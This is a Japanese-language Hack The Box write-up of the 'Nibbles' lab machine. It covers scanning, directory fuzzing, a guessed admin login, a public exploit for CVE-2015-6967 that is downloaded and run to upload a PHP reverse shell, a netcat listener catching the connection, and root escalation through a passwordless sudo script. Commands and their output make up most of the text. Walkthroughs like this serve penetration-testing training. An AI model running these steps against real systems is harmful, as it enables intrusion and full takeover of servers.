https://app.hackthebox.com/machines/Nibbles
## STEP 1
```sh
└─$ rustscan -a 10.129.96.84 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.96.84:22
Open 10.129.96.84:80
10.129.96.84 -> [22,80]
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_01.png">  
コメントをみると、nibbledblogが怪しそう
```sh
└─$ curl http://10.129.96.84/         
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
nibbledblogにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_02.png">  
大した情報はなさそうなので、ディレクトリを探索
```sh
└─$ ffuf -c -w  /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.96.84/nibbleblog/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.155.211/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 472ms]
content                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 248ms]
plugins                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 2268ms]
themes                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 2268ms]
languages               [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 412ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 255ms]
:: Progress: [29999/29999] :: Job [1/1] :: 141 req/sec :: Duration: [0:03:26] :: Errors: 1 ::


└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.129.96.84/nibbleblog/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

install.php             [Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 511ms]
LICENSE.txt             [Status: 200, Size: 35148, Words: 5836, Lines: 676, Duration: 293ms]
update.php              [Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 512ms]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 535ms]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 496ms]
.htaccess               [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 269ms]
feed.php                [Status: 200, Size: 306, Words: 8, Lines: 8, Duration: 395ms]
sitemap.php             [Status: 200, Size: 404, Words: 33, Lines: 11, Duration: 297ms]
.                       [Status: 200, Size: 2989, Words: 116, Lines: 61, Duration: 303ms]
.html                   [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 293ms]
.php                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 320ms]
.htpasswd               [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 283ms]
.htm                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 283ms]
.htpasswds              [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 327ms]
.htgroup                [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 256ms]
COPYRIGHT.txt           [Status: 200, Size: 1272, Words: 168, Lines: 27, Duration: 250ms]
wp-forum.phps           [Status: 403, Size: 313, Words: 22, Lines: 12, Duration: 341ms]
.htaccess.bak           [Status: 403, Size: 313, Words: 22, Lines: 12, Duration: 346ms]
.htuser                 [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 247ms]
.ht                     [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 247ms]
.htc                    [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 248ms]
:: Progress: [17129/17129] :: Job [1/1] :: 136 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
```
admin.phpにアクセスすると、クレデンシャルが必要だった  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_03.png">  
ffufで確認できたディレクトリ内にクレデンシャルがあるかも、例えばadminにアクセスするといくつかのディレクトリを確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_04.png">  
しかしクレデンシャルはguess問でした、「admin:nibbles」  
ログイン成功  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_05.png">


## STEP 3
NibbleBlogのプラグイン「My image」には画像ファイル以外にPHPをアップロードできる脆弱性「CVE-2015-6967」が存在する  
PoCがあるのでダウンロードし実行  
PHPは[Reverse Shell Generator](https://www.revshells.com/)のPentestMonkeyを使用
```sh
└─$ wget https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
2025-04-26 07:00:51 URL:https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py [1932/1932] -> "exploit.py" [1]

└─$ python3.13 exploit.py
usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
exploit.py: error: the following arguments are required: --url/-l, --username/-u, --password/-p, --payload/-x

└─$ python3.13 exploit.py -l http://10.129.96.84/nibbleblog/ -u admin -p nibbles -x shell.php
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell.

└─$ curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
```
リバースシェル取得！
```sh
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.96.84] 39992
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:22:37 up  9:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
bash: cannot set terminal process group (1347): Inappropriate ioctl for device
bash: no job control in this shell

nibbler@Nibbles:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

nibbler@Nibbles:/$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

nibbler@Nibbles:/$ export SHELL=bash

nibbler@Nibbles:/$ export TERM=xterm-256color

nibbler@Nibbles:/$ stty rows 66 columns 236

nibbler@Nibbles:/$ cat /home/nibbler/user.txt
2143c34c53c74de61178e145a81eb812
```


## STEP 4
どうやらsudoがあやしい、パスワードなしでroot権限でシェルスクリプトを実行できるらしい
```sh
nibbler@Nibbles:/$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
該当のシェルスクリプトは存在しなかったので、作成
bashを実行できるシェルスクリプトを作成、sudoで実行すると権限昇格成功！
```sh
nibbler@Nibbles:/$ ls /home/nibbler
personal.zip  user.txt

nibbler@Nibbles:/$ mkdir -p /home/nibbler/personal/stuff

nibbler@Nibbles:/$ echo '# !/bin/bash' > /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/$ echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/$ cat /home/nibbler/personal/stuff/monitor.sh
# !/bin/bash
/bin/bash

nibbler@Nibbles:/$ chmod +x home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh

root@Nibbles:/# id
uid=0(root) gid=0(root) groups=0(root)

root@Nibbles:/# cat /root/root.txt 
a042d31cafc2461bbf2ba0b2c99fdca8
```
